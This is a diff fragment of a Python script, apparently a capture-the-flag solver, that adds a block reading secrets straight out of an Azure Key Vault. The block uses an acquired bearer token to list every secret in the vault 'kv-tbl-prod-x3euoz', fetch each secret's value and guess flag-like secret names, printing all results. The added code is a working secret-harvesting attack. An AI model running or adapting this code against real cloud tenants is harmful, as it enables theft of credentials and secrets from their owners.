@@ -105,3 +105,23 @@ for s in subs:
 print("\n#### FLAG CANDIDATES ####")
 for w, t in HITS:
     print(">>>", w); print(t)
+
+# --- Direct read of the known flag store: kv-tbl-prod-x3euoz ---
+KV_HOST = "kv-tbl-prod-x3euoz.vault.azure.net"
+KVT = token("https://vault.azure.net/.default")
+if KVT:
+    H = {"Authorization": "Bearer " + KVT}
+    s2, b2 = http("https://%s/secrets?api-version=7.4" % KV_HOST, headers=H)
+    show("KV-DIRECT list", s2, b2, 4000)
+    if s2 == 200:
+        for sec in json.loads(b2).get("value", []):
+            s3, b3 = http(sec["id"] + "?api-version=7.4", headers=H)
+            show("KV-DIRECT secret " + sec["id"], s3, b3, 4000)
+    for guess in ("flag", "FLAG", "Flag", "ctf-flag", "tebamoto-flag", "challenge-flag"):
+        s4, b4 = http("https://%s/secrets/%s?api-version=7.4" % (KV_HOST, guess), headers=H)
+        if s4 == 200:
+            show("KV-DIRECT guess " + guess, s4, b4, 4000)
+
+print("\n#### FLAG CANDIDATES (final) ####")
+for w, t in HITS:
+    print(">>>", w); print(t)
